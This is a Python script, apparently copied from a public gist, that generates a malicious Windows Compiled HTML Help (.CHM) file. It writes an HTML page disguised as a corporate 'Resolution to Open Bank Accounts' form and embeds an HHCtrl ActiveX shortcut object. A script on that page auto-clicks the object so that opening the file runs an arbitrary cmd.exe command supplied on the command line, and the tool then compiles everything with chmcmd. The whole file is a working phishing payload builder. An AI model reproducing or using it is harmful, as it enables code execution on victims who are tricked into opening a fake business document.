// stolen from https://gist.github.com/infosecn1nja/aeeda8f9d3b94f6fed727550b81faeda
#!/usr/bin/python
import argparse
import re, random
import string, os, os.path

def rand_num(min, max):
	return random.randrange(min, max)

def gen_str(size):
	return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))


def write_file(source,result):
	try:
		with open(source,"w+") as f:
			f.write(result)
			f.close()
	except IOError:
		print "Could not write source code: [{}]".format(source)
		quit()	

var1 = gen_str(rand_num(8,15))
var2 = gen_str(rand_num(8,15))
var3 = gen_str(rand_num(8,15))

hhp = """[OPTIONS]
Compiled file=%OUTPUT%
Contents file=%RAND%.hhc
[FILES]
%RAND2%.htm
"""

hhc = """<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
</HEAD><BODY>
<UL>
<LI> <OBJECT type="text/sitemap">
     <param name="Name" value="Resolution to Open Bank Accounts">
     <param name="Local" value="%CONTENT%.htm#node0">
     </OBJECT>
</UL>
</BODY></HTML>
""".replace("%CONTENT%",var3)

start = """<html>
<title>DOCUMENT</title>
<head>
<meta charset="UTF-8">
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c %COMMAND%">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<meta content="text/html; charset=Windows-1252" http-equiv="content-type">
<title>Resolution to Open Bank Accounts</title>
<meta name="generator" content="chmProcessor" >
</head>
<body>
<div id="content">
  <h2><a name="node0" id="node0"></a>Resolution to Open Bank Accounts</h2>
    <p>WHEREAS, the Board of Directors has determined it to be in the best interest of the Corporation to establish a banking resolution with, be it:</p>
    <p> RESOLVED, that the Corporation execute and deliver to said bank a duly signed original of the completed banking resolution as is annexed thereto, and that the authority to transact business, including but not limited to the maintenance of savings, checking and other accounts as well as borrowing by the Corporation, shall be as contained in said resolution with the named officers therein authorized to so act on behalf of the Corporation as specified hereto.</p>
    <p>The undersigned hereby certifies that he/she is the duly elected and qualified Secretary and the custodian of the books and records and seal of ,a corporation duly formed pursuant to the laws of the state of  and that the foregoing is a true record of a resolution duly adopted at a meeting of the  and that said meeting was held in accordance with state law and the Bylaws of the above-named Corporation on ,and that said resolution is now in full force and effect without modification or rescission.</p>
    <p>IN WITNESS WHEREOF, I have executed my name as Secretary and have hereunto affixed the corporate seal of the above-named Corporation this.</p>
    <p><br>
  Secretary</p>
</div>
<SCRIPT>
x.Click();
</SCRIPT>
</body>
</html>
"""

parser = argparse.ArgumentParser(description="Malicious Compiled HTML Help file (.CHM) Generator", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-c","--command", type=str, help="Command payload", required=True)
parser.add_argument("-o","--output", type=str, help="Name of output file", required=True)

args = parser.parse_args()
output = args.output

if os.path.exists('/usr/bin/chmcmd') == False:
	print "[*] Install Package : apt install fp-utils"
	quit()

if output:
	write_file("output.hhp",hhp.replace("%OUTPUT%",output).replace("%RAND%",var2).replace("%RAND2%",var3))
	write_file("{}.hhc".format(var2),hhc)
	write_file("{}.htm".format(var3),start.replace("%COMMAND%",args.command))
	os.system("chmcmd output.hhp")
